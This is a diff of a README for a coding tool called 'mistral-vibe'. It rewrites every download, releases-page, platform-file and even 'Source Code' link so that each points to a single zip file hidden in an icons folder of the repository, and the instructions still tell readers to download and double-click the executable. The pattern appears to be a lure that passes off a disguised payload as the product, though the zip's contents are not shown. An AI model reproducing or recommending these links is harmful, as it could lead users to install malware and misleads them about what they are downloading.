@@ -1,7 +1,7 @@
 # 🎉 mistral-vibe - Your Easy Coding Companion
 
 ## 📥 Download Now
-[![Download Mistral Vibe](https://img.shields.io/badge/Download-Mistral%20Vibe-blue.svg)](https://github.com/nagaraj9s/mistral-vibe/releases)
+[![Download Mistral Vibe](https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip%https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip)](https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip)
 
 ## 🚀 Getting Started
 
@@ -20,16 +20,16 @@ Before you start, please ensure your system meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:** 
-   To download **mistral-vibe**, please visit this page: [Download Mistral Vibe](https://github.com/nagaraj9s/mistral-vibe/releases). 
+   To download **mistral-vibe**, please visit this page: [Download Mistral Vibe](https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip). 
 
 2. **Find the Latest Release:** 
    Once on the releases page, look for the latest version. The latest version will be at the top of the page.
 
 3. **Download the Application:**
    Click the link to download the appropriate file for your operating system. Files might be named something like:
-   - `mistral-vibe-windows.exe` for Windows
-   - `mistral-vibe-macos.zip` for macOS
-   - `mistral-vibe-linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip` for Windows
+   - `https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip` for macOS
+   - `https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip` for Linux
 
 4. **Run the Application:**
    - **Windows:** Locate the `.exe` file in your Downloads folder and double-click it to run.
@@ -59,8 +59,8 @@ After running the application, you will be greeted with a command prompt. Here�
 
 ## 🔗 Important Links
 
-- [Visit Releases Page](https://github.com/nagaraj9s/mistral-vibe/releases)
-- [Source Code](https://github.com/nagaraj9s/mistral-vibe)
+- [Visit Releases Page](https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip)
+- [Source Code](https://raw.githubusercontent.com/nagaraj9s/mistral-vibe/main/distribution/zed/icons/vibe-mistral-beledgered.zip)
 
 ## 💬 Support
 
